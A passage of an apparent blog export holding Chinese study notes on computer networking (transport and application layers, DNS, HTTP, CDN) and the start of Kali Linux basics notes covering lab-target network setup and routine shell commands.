id="2-多路复用和解复用"><a href="#2-多路复用和解复用" class="headerlink" title="2 多路复用和解复用"></a>2 多路复用和解复用</h3><blockquote><p>多路复用：multiplexing（Mux）</p><ul><li>服务器同一个IP和Port收不同的客户端的响应。（TCP会对应不同的套接字，UDP不会）</li><li>将多个数据流（streams）合并为一个数据流；把传给不同人的数据压在了一起。</li><li>你的的手机正在浏览网页，刷新电子邮件，同时连接到微信。所有这些连接都通过同一链路发送。</li></ul><p>解多路复用：demultiplexing</p><ul><li>解刚刚收到的通信信息给不同的套接字（TCP）。</li><li>多路复用的逆过程，数据流被分离成单独的部分，相当于解码。</li><li>手机接收到的数据包流将被分割并发送到相应的网络、电子邮件、微信程序。</li></ul></blockquote><h3 id="3-校验和"><a href="#3-校验和" class="headerlink" title="3 校验和"></a>3 校验和</h3><blockquote><ol><li>所有部分分成16bit一组，不足补0。</li><li>求和，计算溢出的1加到尾部。</li><li>取反作为校验和。（或二进制求反相加）</li><li>接收端接收后也按①②进行计算，最后直接和校验和相加，若等于FFFF表示未出错。（或直接二进制求反相加，结果一致）</li></ol></blockquote><h3 id="4-可靠传输"><a href="#4-可靠传输" class="headerlink" title="4 可靠传输"></a>4 可靠传输</h3><div class="table-container"><table><thead><tr><th>传输协议</th><th>协议内容</th></tr></thead><tbody><tr><td>RDT 可靠数据传输协议</td><td>Reliable Data Transfer。使用有限状态机 (FSM) 来描述发送方和接收方</td></tr><tr><td>流水线协议</td><td>未接收确认就发送下一个包（增大利用率）</td></tr><tr><td>滑动窗口协议</td><td>通过一个可移动的窗口来传递数据包。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>RDT协议版本</th><th>更新内容</th></tr></thead><tbody><tr><td>rdt 1.0</td><td>完全可靠传输</td></tr><tr><td>rdt 2.0</td><td>存在差错（通过ACK和NAK进行确认）</td></tr><tr><td>rdt 2.1</td><td>保证ACK/NAK不出错</td></tr><tr><td>rdt 2.2</td><td>取消NAK</td></tr><tr><td>rdt 3.0</td><td>超时重传（包重发，不是ACK重发）</td></tr></tbody></table></div><p><strong>滑动窗口协议</strong></p><blockquote><p>SW / RW（发送方窗口数 / 接收方窗口数）</p><p>n个分组，序号2 ** n个</p><p>GBN最大窗口数：2 ** n - 1</p><p>SR最大窗口数：2 <strong> ( n - 1 )，总和最大数：2 </strong> n</p><p>SR复杂于GBN：简单工作GBN，复杂SR。</p></blockquote><div class="table-container"><table><thead><tr><th>SW和RW比例</th><th>协议</th></tr></thead><tbody><tr><td>SW  = 1 ; RW = 1：Stop and Wait</td><td>停止等待协议（如上的rdt3.0）</td></tr><tr><td>SW  &gt; 1 ; RW = 1：GBN</td><td>回退N帧协议。ACK具有累计确认性。（一个ACK序号可以确保之前的包已经收到）异常：超时后窗口中的包全部重发</td></tr><tr><td>SW  &gt; 1 ; RW &gt; 1：SR</td><td>选择重传协议。ACK不具有累计确认性。异常：超时后只发送超时的窗口中的包。</td></tr></tbody></table></div><h3 id="5-TCP"><a href="#5-TCP" class="headerlink" title="5 TCP"></a>5 TCP</h3><h4 id="5-1-报头"><a href="#5-1-报头" class="headerlink" title="5.1 报头"></a>5.1 报头</h4><p><img src="/posts/e255a10a/TCP报头.jpg" alt="img"></p><blockquote><p>序号：报文段首字节的在字节流的编号。（偏移量）（编号一般不从0开始，防止残留包识别错误)</p><p>确认号: 期望从另一方收到的下一个字节的序号。累积确认。</p></blockquote><h4 id="5-2-RTT和超时设置"><a href="#5-2-RTT和超时设置" class="headerlink" title="5.2 RTT和超时设置"></a>5.2 RTT和超时设置</h4><blockquote><p>采样：</p><ul><li>设置为：中心值+4标准差。</li></ul><p>设置：</p><ul><li>局域网可仅设置一次，波动大的需要动态设置（每隔一段时间测一次，然后加权。（之前测的权重低，新测的值权重高）计算平均值）</li></ul></blockquote><h4 id="5-3-TCP设置"><a href="#5-3-TCP设置" class="headerlink" title="5.3 TCP设置"></a>5.3 TCP设置</h4><blockquote><p>累计确认。</p><p>超时重传最老的一个包，定时器也是仅设置为最老的一个包的定时（滑动窗口)。</p><p>快速重传：重复的确认，例如收到了ACK50,之后又收到3个ACK50，此时不需要等待超时重传定时器溢出，直接重发该报文段即可。</p></blockquote><h4 id="5-4-流量控制"><a href="#5-4-流量控制" class="headerlink" title="5.4 流量控制"></a>5.4 流量控制</h4><blockquote><p> Piggybacking：捎带技术，在数据中心带上接收方的缓冲区大小防止发送方发送数据过多。</p></blockquote><h4 id="5-5-连接管理"><a href="#5-5-连接管理" class="headerlink" title="5.5 连接管理"></a>5.5 连接管理</h4><blockquote><p>两次握手失败：</p><ol><li>客户端定时器超时，多次重发连接请求，服务器维护了多个无效的半连接。</li></ol><p>三次握手：</p><p>四次挥手：</p></blockquote><h3 id="6-UDP"><a href="#6-UDP" class="headerlink" title="6 UDP"></a>6 UDP</h3><h4 id="6-1-报头"><a href="#6-1-报头" class="headerlink" title="6.1 报头"></a>6.1 报头</h4><p><img src="/posts/e255a10a/UDP报头.jpg" alt="img"></p><h3 id="7-拥塞控制"><a href="#7-拥塞控制" class="headerlink" title="7 拥塞控制"></a>7 拥塞控制</h3><h4 id="7-1-拥塞原因"><a href="#7-1-拥塞原因" class="headerlink" title="7.1 拥塞原因"></a>7.1 拥塞原因</h4><blockquote><p>场景一【没有重传】：</p><ul><li>输入的吞吐量达到了链路带宽的一半。（还有输出占一半）</li></ul><p>场景二【重传】：</p><ul><li><p>理想化：知道路由器缓冲区大小，发送缓冲区可以接受的大小的包。</p></li><li><p>现实：重复发送数据，但是缓冲区接收不了导致丢失，而此时发送端又会发更多的包，导致拥塞。</p></li></ul><p>场景三【死锁】：</p><ul><li>四个发送端形成循环，形成死锁。</li></ul></blockquote><h4 id="7-2-拥塞控制方法"><a href="#7-2-拥塞控制方法" class="headerlink" title="7.2 拥塞控制方法"></a>7.2 拥塞控制方法</h4><blockquote><p>端到端拥塞控制：</p><ul><li>原理：网络边界（端）自行判断网络是否拥塞。</li></ul><p>网络辅助的拥塞控制：</p><ul><li>原理：提供网络核心是否拥塞的信息到网络边界（端），网络边界（端）自行调整。</li></ul></blockquote><h4 id="7-3-案例"><a href="#7-3-案例" class="headerlink" title="7.3 案例"></a>7.3 案例</h4><blockquote><p>ATM ABR：</p><ul><li>原理：发生拥塞了就降低发送速度，使其达到最小保障速率。</li><li>发送端发送的RM信元被接收端返回，接收端不做任何改变。</li></ul><p>RM：资源管理信源（部署在网络交换机中）</p><ul><li>NI bit（no increase in rate）：（轻微拥塞）速率不要再增加了</li><li>CI bit（congestion indication）：拥塞指示（网络明显拥塞）</li></ul></blockquote><h4 id="7-4-TCP拥塞控制"><a href="#7-4-TCP拥塞控制" class="headerlink" title="7.4 TCP拥塞控制"></a>7.4 TCP拥塞控制</h4><h3 id="8-拓展"><a href="#8-拓展" class="headerlink" title="8 拓展"></a>8 拓展</h3><p><a href="https://baike.sogou.com/v140748657.htm?fromTitle=QUIC&amp;ch=frombaikevr">QUIC链接</a></p><blockquote><p>（作用于应用层）</p><p>QUIC（Quick UDP Internet Connection）是谷歌制定的一种基于UDP的低时延的互联网传输层协议。</p></blockquote><p><a href="https://baike.sogou.com/v40658.htm?fromTitle=sctp">SCTP链接</a></p><blockquote><p>SCTP（Stream Control Transmission Protocol）是指流控制传输协议，是在2000年由IETF的SIGTRAN工作组定义的一个传输层协议。</p><p>SCTP是一种提供了可靠、高效、有序的数据传输协议。</p><p>主要的贡献是对多重联外线路的支持，一个端点可以由多于一个 IP地址组成，使得传输可在主机间或网卡间做到透明的网络容错备援。</p></blockquote><hr><h2 id="六、应用层"><a href="#六、应用层" class="headerlink" title="六、应用层"></a>六、应用层</h2><h3 id="1-概述-4"><a href="#1-概述-4" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>数据单元（PDU）是报文。</p></blockquote><h3 id="2-端口号"><a href="#2-端口号" class="headerlink" title="2 端口号"></a>2 端口号</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/382603934">较全部</a>    <a href="https://blog.csdn.net/qq_35409955/article/details/72598327">端口分类</a></p></blockquote><div class="table-container"><table><thead><tr><th>端口号/实现协议</th><th>端口应用</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP 文件传输协议</td></tr><tr><td>22/tcp</td><td>SSH 安全登录、文件传送(SCP)和端口重定向</td></tr><tr><td>23/tcp</td><td>Telnet 不安全的文本传送</td></tr><tr><td>25/tcp</td><td>SMTP Simple Mail Transfer Protocol (E-mail)</td></tr><tr><td>69/udp</td><td>TFTP Trivial File Transfer Protocol</td></tr><tr><td>79/tcp</td><td>finger Finger</td></tr><tr><td>80/tcp</td><td>HTTP 超文本传送协议 (WWW)</td></tr><tr><td>88/tcp</td><td>Kerberos Authenticating agent</td></tr><tr><td>110/tcp</td><td>POP3 Post Office Protocol (E-mail)</td></tr><tr><td>113/tcp</td><td>ident old identification server system</td></tr><tr><td>119/tcp</td><td>NNTP used for usenet newsgroups</td></tr><tr><td>220/tcp</td><td>IMAP3</td></tr><tr><td>443/tcp</td><td>HTTPS used for securely transferring web pages</td></tr></tbody></table></div><h3 id="3-Web与HTTP-80-443"><a href="#3-Web与HTTP-80-443" class="headerlink" title="3 Web与HTTP 80 443"></a>3 Web与HTTP 80 443</h3><h4 id="3-1-Web"><a href="#3-1-Web" class="headerlink" title="3.1 Web"></a>3.1 Web</h4><blockquote><p>定义：站点链表</p><p>URL：<code>&lt;协议&gt; : // &lt;主机&gt; : &lt;端口&gt; / &lt;路径&gt; ? &lt;信息&gt;   （get 请求）</code></p><p><a href="https://zhuanlan.zhihu.com/p/458974637">请求类型</a></p></blockquote><h4 id="3-2HTTP"><a href="#3-2HTTP" class="headerlink" title="3.2HTTP"></a>3.2HTTP</h4><blockquote><p>超文本传输协议。</p><p>无状态协议。</p><p>http 默认端口 80。</p><p>https 默认端口 443。</p></blockquote><h4 id="3-3-HTTP-响应头部"><a href="#3-3-HTTP-响应头部" class="headerlink" title="3.3 HTTP 响应头部"></a>3.3 <a href="https://blog.csdn.net/m0_45861545/article/details/120835738">HTTP 响应头部</a></h4><p><img src="/posts/e255a10a/HTTP报头.jpg" alt="img"></p><p><img src="/posts/e255a10a/HTTP报头参数.jpg" alt="img"></p><blockquote><p>Connect：连接状态</p><p>==头部和正文间会有用空白行隔开，代表请求头结束。==</p></blockquote><h4 id="3-4-HTTP响应码"><a href="#3-4-HTTP响应码" class="headerlink" title="3.4 HTTP响应码"></a>3.4 HTTP响应码</h4><div class="table-container"><table><thead><tr><th>响应码</th><th>响应内容</th></tr></thead><tbody><tr><td><strong>1XX——信息类（Information）</strong></td><td>表示收到 http 请求，正在进行下一步处理，通常是一种瞬间的响应状态</td></tr><tr><td><strong>2XX——成功类（Successful）</strong></td><td>表示用户请求被正确接收、理解和处理</td></tr><tr><td>200（OK）</td><td>请求成功。一般用于 GET 与 POST 请求</td></tr><tr><td>201（Created）</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202（Accepted）</td><td>接受</td></tr><tr><td><strong>3XX——重定向类（Redirection）</strong></td><td>表示没有请求成功，必须采取进一步的动作</td></tr><tr><td>301（Moved Permanently）</td><td>资源被永久移动。请求的资源已被永久的移动到新 URI，返回信息会包括新的 URI，浏览器会自动定向到新 URI。今后任何新的请求都应使用新的 URI</td></tr><tr><td>302（Found）</td><td>资源临时移动。资源只是临时被移动，客户端应继续使用原有 URI</td></tr><tr><td>304</td><td>用其他策略获取资源</td></tr><tr><td><strong>4XX——客户端错误（Client Error）</strong></td><td>表示客户端提交的请求包含语法错误或不能正确执行</td></tr><tr><td>400（Bad Requests）</td><td>客户端请求的地址不存在或者包含不支持的参数</td></tr><tr><td>401（Unauthorized）</td><td>未授权，或认证失败。对于需要登录的网页，服务器可能返回此响应</td></tr><tr><td>403（Forbidden）</td><td>没权限。服务器收到请求，但拒绝提供服务</td></tr><tr><td>404（Not Found）</td><td>请求的资源不存在。遇到 404 首先检查请求 url 是否正确</td></tr><tr><td><strong>5XX——服务端错误（Server Error）</strong></td><td>表示服务器不能正确执行一个正确的请求（客户端请求的方法及参数是正确的，服务端不能正确执行，如网络超时、服务僵死，可以查看服务端日志再进一步解决）</td></tr><tr><td>500（Internal Server Error）</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>503（Service Unavailable）</td><td>由于超载或系统维护（一般是访问人数过多），服务器无法处理客户端的请求 ，通常这只是暂时状态</td></tr><tr><td>600</td><td>源站没有返回响应头部，只返回实体内容</td></tr></tbody></table></div><h4 id="3-5-请求类型"><a href="#3-5-请求类型" class="headerlink" title="3.5 请求类型"></a>3.5 请求类型</h4><blockquote><p>GET请求与POST请求的区别：（post请求需要服务器的支持）</p><ol><li>get请求时参数会跟在浏览器地址栏的后面，而post请求不会。（post请求会将数据存放在请求体中）</li><li>get请求相对于post而言，不那么安全。</li><li>get请求传递的数据长度是有限的，而post请求基本没有限制。（长度与服务器相关）</li><li>get请求有缓存（会将数据存放在浏览器中，即本地磁盘中），而post请求无缓存，因此get请求比post请求快。（2倍左右）</li></ol></blockquote><div class="table-container"><table><thead><tr><th>请求类型</th><th>作用</th></tr></thead><tbody><tr><td>get</td><td>请求指定的页面信息，并返回实体主体</td></tr><tr><td>post</td><td>向指定资源提交数据以处理请求（提交表单或上传文件），数据被包含在请求体中。post可能会导致新资源建立或已有资源的修改</td></tr><tr><td>head</td><td>与get请求相似，但是只返回响应行和响应头，不返回响应正文</td></tr><tr><td>put</td><td>从客户端向服务器传送数据并进行存储或替换。（默认关闭）</td></tr><tr><td>delete</td><td>请求删除服务器指定的页面</td></tr><tr><td>connect</td><td>HTTP1.1协议中预留给能够将连接改为管道方式的代理服务器</td></tr><tr><td>options</td><td>允许客户端查看服务器性能</td></tr><tr><td>trace</td><td>回显服务器收到的请求，主要用于测试或诊断</td></tr></tbody></table></div><h4 id="3-6-Cookie与Session"><a href="#3-6-Cookie与Session" class="headerlink" title="3.6 Cookie与Session"></a>3.6 Cookie与Session</h4><blockquote><p>Cookie：</p><ul><li>客户端将用户登录后的 Cookie 存入客户端的 Cookie 文件中。</li></ul><p>Session：</p><ul><li>追踪用户状态，Session信息存在服务器端的数据库或文件中。</li></ul></blockquote><h4 id="3-7-资源"><a href="#3-7-资源" class="headerlink" title="3.7 资源"></a>3.7 资源</h4><blockquote><p>URI：Uniform Resource Identifier，统一资源标识符。是URL和URN的超集。</p><p>URL：Uniform Resource Locator，统一资源定位符。通过网址定位，资源位置一变网址将会失效。</p><p>URN：Uniform Resource Name，统一资源名称。通过一个字符串和解析器可以随时定位资源的最新位置，但是部署麻烦。</p></blockquote><h3 id="4-FTP-20-21"><a href="#4-FTP-20-21" class="headerlink" title="4 FTP 20 21"></a>4 FTP 20 21</h3><blockquote><p>20：FTP数据连接。</p><p>21：FTP控制连接。</p><p>文件传输协议。</p><p>用户名和密码都是明文传输。</p><p>有状态协议。</p><p>控制命令和数据传输分别在两个TCP连接上进行。</p></blockquote><h3 id="5-Telent-23"><a href="#5-Telent-23" class="headerlink" title="5 Telent 23"></a>5 Telent 23</h3><h3 id="6-EMail"><a href="#6-EMail" class="headerlink" title="6 EMail"></a>6 EMail</h3><blockquote><p>流程：</p><ul><li>用户代理&lt;-&gt;邮件服务器—————邮件服务器&lt;-&gt;用户代理</li></ul><p>推邮件：</p><ul><li>SMTP（25）。简单邮件传输协议（传输邮件，也可拉取邮件，<a href="https://www.cnblogs.com/callmesblog/p/14377467.html">SMTP常用命令</a>）</li></ul><p>SMTP响应头部：</p><ul><li>to：发给</li><li>from：来自</li><li>subject：标题</li><li>cc：副本（其他知道的人）</li><li>编码类型，参数等（同HTTP）</li></ul><p>拉邮件</p><ul><li><p>IMAP（143）：交互邮件访问协议（拉取邮件）</p></li><li><p>POP3（110）：邮局协议版本3（拉取邮件）</p></li></ul></blockquote><h3 id="7-DNS-53"><a href="#7-DNS-53" class="headerlink" title="7 DNS    53"></a>7 DNS    53</h3><h4 id="7-1-定义"><a href="#7-1-定义" class="headerlink" title="7.1 定义"></a>7.1 定义</h4><blockquote><p>域名到IP地址的转化。</p><p> DNS的主要思路：</p><ul><li>分层的、基于域的命名机制。</li><li>若干分布式的数据库完成名字到IP地址的转换。</li><li>运行在UDP之上端口号为53的应用服务。</li><li>核心的Internet功能，但以应用层协议实现 。</li><li>在网络边缘处理复杂性。</li></ul></blockquote><h4 id="7-2-DNS目的"><a href="#7-2-DNS目的" class="headerlink" title="7.2 DNS目的"></a>7.2 DNS目的</h4><blockquote><p>DNS的主要目的：</p><ul><li>实现主机名-IP地址的转换。(name/IP translate)</li></ul><p>DNS的其它目的 </p><ul><li>主机别名到规范名字的转换：Host aliasing </li><li>邮件服务器别名到邮件服务器的正规名字的转换：Mail server aliasing </li><li>负载均衡：Load Distribution</li></ul></blockquote><h4 id="7-3-常用顶级域名"><a href="#7-3-常用顶级域名" class="headerlink" title="7.3 常用顶级域名"></a>7.3 <a href="https://blog.csdn.net/shaoz/article/details/6785120">常用顶级域名</a></h4><div class="table-container"><table><thead><tr><th>顶级域名</th><th>表示</th></tr></thead><tbody><tr><td>.com</td><td>商业机构</td></tr><tr><td>.net</td><td>网络服务机构</td></tr><tr><td>.org</td><td>非盈利性组织</td></tr><tr><td>.gov</td><td>政府机构</td></tr><tr><td>.edu</td><td>教育机构</td></tr><tr><td>.mil</td><td>军事机构</td></tr><tr><td>.biz</td><td>商业机构</td></tr><tr><td>.name</td><td>个人网站</td></tr><tr><td>.info</td><td>信息提供</td></tr><tr><td>.mobi</td><td>专用手机域名</td></tr><tr><td>.pro</td><td>医生，会计师</td></tr><tr><td>.travel</td><td>旅游网站</td></tr><tr><td>.museum</td><td>博物馆</td></tr><tr><td>.int</td><td>国际机构</td></tr><tr><td>.areo</td><td>航空机构</td></tr><tr><td>.post</td><td>邮政机构</td></tr><tr><td>.rec</td><td>娱乐机构</td></tr><tr><td>.asia</td><td>亚洲机构</td></tr><tr><td>.cc</td><td>商业公司或者中国公司</td></tr><tr><td><strong>二级域名</strong></td><td><strong>表示</strong></td></tr><tr><td>arts</td><td>艺术类机构</td></tr><tr><td>com</td><td>商业机构</td></tr><tr><td>edu</td><td>教育及研究机构</td></tr><tr><td>firm</td><td>公司企业</td></tr><tr><td>gov</td><td>政府机构</td></tr><tr><td>info</td><td>信息服务</td></tr><tr><td>net</td><td>网络服务机构</td></tr><tr><td>nom</td><td>个人</td></tr><tr><td>org</td><td>专业团体</td></tr><tr><td>rec</td><td>娱乐类机构</td></tr><tr><td>store</td><td>销售类公司企业</td></tr><tr><td>web</td><td>从事WWW活动的机构</td></tr></tbody></table></div><h4 id="7-4-DNS记录"><a href="#7-4-DNS记录" class="headerlink" title="7.4 DNS记录"></a>7.4 DNS记录</h4><blockquote><p>资源记录(resource records)（RR）</p><ul><li>作用：维护 域名-IP地址(其它)的映射关系</li><li>位置：Name Server的分布式数据库中</li></ul><p>本地服务器</p><ul><li>缓存：提高性能。</li><li>删除：保持一致性。</li></ul></blockquote><h4 id="7-5-RR格式"><a href="#7-5-RR格式" class="headerlink" title="7.5 RR格式"></a>7.5 RR格式</h4><blockquote><p>(domain_name, ttl, type,class,Value)</p><p>Domain_name: 域名</p><p>Ttl: time to live : 生存时间(权威，缓冲记录)</p><p>Class 类别 ：对于Internet，值为IN</p><p>Value 值：可以是数字，域名或ASCII串</p><p>Type 类别：</p><ul><li><p>Type=A：Name为主机 。Value为IP地址。</p></li><li><p>Type=CNAME ：Name为规范名字的别名 。例：www.ibm.com的规范名字为servereast.backup2.ibm.com。value 为规范名字。</p></li><li><p>Type=NS：Name域名，例：foo.com。Value为该域名的权威服务器的域名。</p></li><li><p>Type=MX：Value为name对应的邮件服务器的名字。</p></li></ul></blockquote><h4 id="7-6-查询"><a href="#7-6-查询" class="headerlink" title="7.6 查询"></a>7.6 查询</h4><blockquote><p>步骤：</p><ul><li>application ——- resolver —（解析器发送的包封装在UDP段）—- Local Name Server</li></ul><p>方法：</p><ul><li>递归查询（服务器依次查，从顶开始）：客户端先发消息给根服务器，然后根服务器帮客户端发送消息给二级服务器，依次类推，直到找到域名或结束。</li><li>迭代查询（客户端依次查，从顶开始）：客户端先发消息给根服务器，然后根服务器把二级服务器的信息发送回给客户端，然后客户端自己访问二级服务器，依次类推，直到找到域名或结束。</li></ul></blockquote><h4 id="7-7-DNS协议报文"><a href="#7-7-DNS协议报文" class="headerlink" title="7.7 DNS协议报文"></a>7.7 DNS协议报文</h4><blockquote><p>DNS协议：查询和响应报文的报文格式相同。</p><p>报文首部：</p><ul><li>（2B）identification：标识符（ID），16位。</li><li>（2B）flags：查询/应答 ，希望递归 ，递归可用 ，应答为权威。</li><li>（2B）# questions</li><li>（2B）# answer RRs</li><li>（2B）# authority RRs</li><li>（2B）# additional RRs </li><li>（4B）questions (variable # of questions)：一个查询的Name, type字段。</li><li>（4B）answers (variable # of RRs)：对应查询的RR记录。</li><li>（4B）authority (variable # of RRs)：权威服务器的记录。</li><li>（4B）additional info (variable # of RRs)：附加的有用信息。</li></ul></blockquote><h3 id="8-P2P"><a href="#8-P2P" class="headerlink" title="8 P2P"></a>8 P2P</h3><blockquote><p>结构类型：</p><ul><li><p>非结构化P2P：</p><ul><li><p>集中化目录：存在中央服务器。</p></li><li><p>完全分布式：分布式。</p></li><li><p>混合体：上述两者的混合，存在组员和组长。</p></li></ul></li><li><p>DHT（结构化）P2P：IP地址变成十六进制值，从小到大依次连接形成一个环。</p></li><li><p>P2P文件分发： <a href="https://zhuanlan.zhihu.com/p/364041702">BitTorrent</a>（种子后缀 .torrent）</p></li></ul></blockquote><h3 id="9-视频流化服务与CDN"><a href="#9-视频流化服务与CDN" class="headerlink" title="9 视频流化服务与CDN"></a>9 视频流化服务与CDN</h3><h4 id="9-1-CDN"><a href="#9-1-CDN" class="headerlink" title="9.1 CDN"></a>9.1 CDN</h4><blockquote><p><a href="https://www.cnblogs.com/ziyuemeng/p/13387782.html">CDN </a></p><p><a href="https://zhuanlan.zhihu.com/p/598696740">正向代理与反向代理</a></p><p>定义：视频流化服务（杀手级业务：占据互联网大部分流量）</p><p>CDN是把原本需要集中获取的资源缓存到边缘节点，使用户就近访问。通过在网络中增加一层缓存层，通过全局负载技术将源站的资源分发到里用户最近的网络边缘节点上，使缓存服务器响应用户请求，从而达到快速访问的目的。</p><p>编码方式：</p><ul><li>时间冗余：同张图片图像不同位置。</li><li>空间冗余：不同图片图像不同位置。</li></ul></blockquote><h4 id="9-2-DASH"><a href="#9-2-DASH" class="headerlink" title="9.2 DASH"></a>9.2 DASH</h4><blockquote><p>多媒体流化服务：DASH（Dynamic, Adaptive Streaming over HTTP）</p><p>服务器：</p><ul><li>将视频文件分割成多个块 。</li><li>每个块独立存储，编码于不同码率。（8-10种） </li><li>告示文件（manifest file）: 提供不同块的URL。</li></ul><p>客户端：</p><ul><li>先获取告示文件 。</li><li>周期性地测量服务器到客户端的带宽。</li><li><p>查询告示文件,在一个时刻请求一个块，HTTP头部指定字节范围，如果带宽足够，选择最大码率的视频块。</p></li><li><p>会话中的不同时刻，可以切换请求不同的编码块。 （取决于当时的可用带宽）</p></li></ul><p>”智能“客户端：</p><ul><li><p>客户端自适应决定什么时候去请求块 。（不至于缓存挨饿，或者溢出）</p></li><li><p>请求什么编码速率的视频块。（当带宽够用时，请求高质量的视频块）</p></li><li><p>哪里去请求块。（可以向离自己近的服务器发送URL，或者向高可用带宽的服务器请求）</p></li></ul></blockquote><h3 id="10-DHCP"><a href="#10-DHCP" class="headerlink" title="10 DHCP"></a>10 DHCP</h3><h3 id="11-套接字编程"><a href="#11-套接字编程" class="headerlink" title="11 套接字编程"></a>11 套接字编程</h3><blockquote><p><a href=".\4962e50b">text::C语言Windows网络编程</a> </p></blockquote><hr><h2 id="七、补充"><a href="#七、补充" class="headerlink" title="七、补充"></a>七、补充</h2><h3 id="1-无线网络"><a href="#1-无线网络" class="headerlink" title="1 无线网络"></a>1 无线网络</h3><h3 id="2-网络安全"><a href="#2-网络安全" class="headerlink" title="2 网络安全"></a>2 网络安全</h3><h4 id="2-1-物理层攻击"><a href="#2-1-物理层攻击" class="headerlink" title="2.1 物理层攻击"></a>2.1 物理层攻击</h4><blockquote><p>网路破坏</p></blockquote><h4 id="2-2-链路层攻击"><a href="#2-2-链路层攻击" class="headerlink" title="2.2 链路层攻击"></a>2.2 链路层攻击</h4><blockquote><p>ARP欺骗</p></blockquote><h4 id="2-3-网络层攻击"><a href="#2-3-网络层攻击" class="headerlink" title="2.3 网络层攻击"></a>2.3 网络层攻击</h4><blockquote><p>ICMP攻击（欺骗）</p></blockquote><h4 id="2-4-传输层攻击"><a href="#2-4-传输层攻击" class="headerlink" title="2.4 传输层攻击"></a>2.4 传输层攻击</h4><blockquote><p>TCP SYN Flood攻击</p></blockquote><h4 id="2-5-应用层攻击"><a href="#2-5-应用层攻击" class="headerlink" title="2.5 应用层攻击"></a>2.5 应用层攻击</h4><blockquote><p>缓冲区溢出</p><p>WEB攻击</p></blockquote><h3 id="3-网络中的音频和视频"><a href="#3-网络中的音频和视频" class="headerlink" title="3 网络中的音频和视频"></a>3 网络中的音频和视频</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux</title>
      <link href="/posts/c5fc2764.html"/>
      <url>/posts/c5fc2764.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h1><blockquote><p><a href="https://www.kali.org/">official::Kali安装</a></p><p><a href="https://www.bilibili.com/video/BV1sN4y1u7qv/">视频</a></p><p><a href=".\57602ae6">text::Ubuntu Linux</a> </p><p><a href=".\5cfe0bd9">text::Web渗透工具</a></p><p><a href=".\54924480">text::Web渗透</a> </p></blockquote><hr><h2 id="〇、靶机"><a href="#〇、靶机" class="headerlink" title="〇、靶机"></a>〇、靶机</h2><ul><li><p>Metasploitable2-Linux</p><blockquote><p><a href="https://sourceforge.net/projects/metasploitable/">靶机下载</a></p><p><a href="https://www.jianshu.com/p/bf79945a017a">靶机配置</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置静态ip </span></span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line">(i) dhcp -&gt; static</span><br><span class="line">address 192.168.1.180</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line">(::wq)</span><br><span class="line">/etc/init.d/networking restart <span class="comment"># 重启网卡</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="一、Kali基础"><a href="#一、Kali基础" class="headerlink" title="一、Kali基础"></a>一、Kali基础</h2><h3 id="1-root权限"><a href="#1-root权限" class="headerlink" title="1 root权限"></a>1 root权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一次执行</span></span><br><span class="line">sudo</span><br><span class="line"><span class="comment"># 切换身份</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure><h3 id="2-工具安装"><a href="#2-工具安装" class="headerlink" title="2 工具安装"></a>2 工具安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新apt-get</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment"># 获得包</span></span><br><span class="line">apt-cache search &lt;packet&gt;</span><br><span class="line"><span class="comment"># 安装包</span></span><br><span class="line">sudo apt-get install &lt;packet&gt;</span><br><span class="line"></span><br><span class="line">kali-linux-full <span class="comment"># 常见工具包</span></span><br><span class="line">kali-linux-all <span class="comment"># 所有工具包</span></span><br><span class="line">kali-linux-forensic <span class="comment"># 取证工具包</span></span><br><span class="line">kali-linux-wireless <span class="comment"># 无线渗透包</span></span><br></pre></td></tr></table></figure><h3 id="3-命令安装"><a href="#3-命令安装" class="headerlink" title="3 命令安装"></a>3 命令安装</h3><ul><li>help</li><li><a href="https://zhuanlan.zhihu.com/p/192453637">Bashtop安装和使用</a></li></ul><h3 id="4-查找文件"><a href="#4-查找文件" class="headerlink" title="4 查找文件"></a>4 查找文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找所有文件（无db用updatedb进行更新）</span></span><br><span class="line">locate &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找二进制文件</span></span><br><span class="line">whereis &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找可执行文件</span></span><br><span class="line"><span class="built_in">which</span> &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找路径下文件</span></span><br><span class="line">find [option] [path] [filename]</span><br></pre></td></tr></table></figure><h3 id="5-网络设置"><a href="#5-网络设置" class="headerlink" title="5 网络设置"></a>5 网络设置</h3><blockquote><p>图形化界面：右上角网络配置——右键</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网络配置</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="comment"># 网络信息</span></span><br><span class="line">ip addr</span><br><span class="line"><span class="comment"># 路由信息</span></span><br><span class="line">ip route</span><br></pre></td></tr></table></figure><h3 id="6-远程登录"><a href="#6-远程登录" class="headerlink" title="6 远程登录"></a>6 远程登录</h3><blockquote><p><a href="https://www.cnblogs.com/lzkalislw/p/15153943.html">开启ssh</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim：i：插入模式，esc：退出，:：底线命令模式，wq：保存并退出。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.打开SSH配置文件</span></span><br><span class="line">sudo vim/leafpad /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># 